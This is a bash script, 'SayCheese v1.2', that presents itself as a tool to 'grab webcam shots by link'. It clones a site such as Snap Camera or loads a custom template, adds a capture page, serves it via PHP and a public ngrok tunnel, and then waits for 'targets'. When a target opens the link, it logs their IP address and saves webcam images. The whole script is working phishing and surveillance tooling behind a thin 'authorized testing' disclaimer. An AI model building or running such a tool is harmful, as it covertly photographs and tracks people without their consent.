#!/bin/bash
# SayCheese v1.2
# Coded by: @linux_choice (twitter)
# Github: https://github.com/thelinuxchoice/saycheese

trap 'printf "\n";stop' 2

banner() {


printf "      \e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
printf "      \e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
printf "      \e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
printf "      \e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
printf "      \e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
printf "      \e[1;92m              |___/ \e[0m                                 \n"

printf "\n"
printf "\e[1;77m               .:.:\e[0m\e[1;93m Grab webcam shots by link \e[0m\e[1;77m:.:.\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.2 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.2 Moded by Youtube.com/TechnicalHeadquarter             \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]          github.com/thelinuxchoice/saycheese(Repository Deleted)          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"
printf "          Tested on Latest Versions......\n"
printf "         For Any help search 'Youtube.com/TechnicalHeadquarter'\n"

printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it.(apt install php) Aborting."; exit 1; }


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\e[1;77m (saved in images/)\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done

}



ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it(apt install unzip). Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it(apt install wget). Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o 'amd64' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'amd64'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server(Turn On Hotspot if on termux) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
php -S 0.0.0.0:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server(Hotspot must be started) \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

if [[ -z $link ]];then
printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
exit 1
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link

}

start() {

if [[ ! -d images/ ]]; then
mkdir images
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Mirror website\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom template(.html file)\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: (apt-get install httrack) "; exit 1; }
default_website_mirror="https://snapcamera.snapchat.com"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror
read website_mirror
website_mirror="${website_mirror:-${default_website_mirror}}"
printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
if [[ ! -d websites/ ]]; then
mkdir websites
fi

httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
payload
ngrok_server
checkfound


elif [[ $option_server -eq 2 ]]; then
default_website_template="saycheese.html"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
website_template="${website_template:-${default_website_template}}"
if [[ -f $website_template ]]; then

if [[ $website_template == *'index.php'* ]]; then
printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
exit 1
fi

cat $website_template > index.php
cat template.html >> index.php
ngrok_server
checkfound

else
printf "\e[91m[!] File not found\n"
printf " For Any help search 'Youtube.com/TechnicalHeadquarter'\n"


exit 1
fi

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
printf " For Any help search 'Youtube.com/TechnicalHeadquarter'\n"
sleep 1
clear
start
fi

}


payload() {

index_file=$(grep -o 'HREF=".*"' websites/index.html | cut -d '"' -f2)

if [ -f websites/"$index_file" ]; then
cat websites/$index_file > index.php
cat template.html >> index.php
fi
}


banner
dependencies
start
